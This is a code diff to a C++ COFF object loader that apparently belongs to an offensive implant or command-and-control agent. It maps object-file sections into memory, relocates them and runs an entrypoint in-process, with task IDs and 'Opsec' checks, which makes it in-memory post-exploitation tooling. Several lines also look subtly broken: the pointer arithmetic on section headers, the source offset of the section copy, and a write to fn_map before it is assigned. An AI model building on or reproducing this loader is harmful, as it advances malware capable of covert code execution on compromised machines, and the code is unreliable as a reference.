@@ -133,7 +133,7 @@ namespace Objects {
         return success;
     }
 
-    BOOL ExecuteFunction(_executable *object, uint32_t function, void *args, size_t size) {
+    BOOL ExecuteFunction(_executable* object, char* function, void* args, size_t size) {
         // todo: still believe I want these functions to be pre-hashed
 
         void        *veh_handle = { };
@@ -382,33 +382,54 @@ namespace Objects {
     VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size, uint32_t task_id) {
 
         _executable *object = { };
-        void        *next   = { };
-        bool        success = true;
+        uint8_t     *next   = { };
 
-        x_assertb(data);
+        x_assert(data);
 
         object          = (_executable*) x_malloc(sizeof(_executable));
         object->buffer  = B_PTR(data);
         object->nt_head = NT_HEADERS(object->buffer, DOS_HEADER(object->buffer));
+
         object->symbol  = (_symbol*)U_PTR(object->buffer) + object->nt_head->FileHeader.PointerToSymbolTable;
         object->task_id = task_id;
         object->next    = Ctx->coffs;
 
         Ctx->coffs = object;
 
-        x_assertb(Opsec::ImageCheckArch(object));
-        x_assertb(object->sec_map = (_object_map*)x_malloc(sizeof(void*) * sizeof(_object_map)));
-        x_assertb(object->fn_map->size = GetFunctionMapSize(object));
+        x_assert(Opsec::ImageCheckArch(object));
+        x_assert(object->sec_map = (_object_map*)x_malloc(sizeof(void*) * sizeof(_object_map)));
+        x_assert(object->fn_map->size = GetFunctionMapSize(object));
 
         for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
             object->section = (IMAGE_SECTION_HEADER*) object->buffer + sizeof(IMAGE_FILE_HEADER) + (sizeof(IMAGE_SECTION_HEADER) * sec_index);
+
             object->size    += object->section->SizeOfRawData;
             object->size    = (size_t) U_PTR(PAGE_ALIGN(object->size));
         }
 
         object->size += object->fn_map->size;
-        x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &object->base, NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+        x_ntassert(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &object->base, NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+
+        next = B_PTR(object->base);
+        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
+            object->section = (IMAGE_SECTION_HEADER*) object->buffer + sizeof(IMAGE_FILE_HEADER) + (sizeof(IMAGE_SECTION_HEADER) * sec_index);
+
+            object->sec_map[sec_index].size     = object->section->SizeOfRawData;
+            object->sec_map[sec_index].address  = next;
+
+            next += object->section->SizeOfRawData;
+            next = PAGE_ALIGN(next);
+
+            x_memcpy(object->sec_map[sec_index].address, C_PTR(U_PTR(data) + object->section->SizeOfRawData), object->section->SizeOfRawData);
+        }
+
+        object->fn_map = (_object_map*) next;
+
+        x_assert(BaseRelocation(object));
+        x_assert(ExecuteFunction(object, entrypoint, args, args_size));
 
         defer:
+        Cleanup(object);
+        RemoveCoff(object);
     }
 }
